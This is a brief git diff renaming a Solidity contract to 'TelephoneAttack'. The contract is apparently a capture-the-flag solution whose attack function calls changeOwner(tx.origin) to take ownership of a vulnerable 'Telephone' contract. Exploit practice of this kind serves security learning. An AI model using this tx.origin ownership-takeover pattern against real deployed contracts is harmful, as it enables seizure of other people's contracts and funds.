@@ -6,7 +6,7 @@ import {Broadcasted} from "./Broadcasted.sol";
 
 import {console} from "forge-std/Script.sol";
 
-contract TelephoneAttk is Broadcasted {
+contract TelephoneAttack is Broadcasted {
     function attack(address payable telephoneCtr_) public payable override {
         ITelephone(telephoneCtr_).changeOwner(tx.origin);
     }
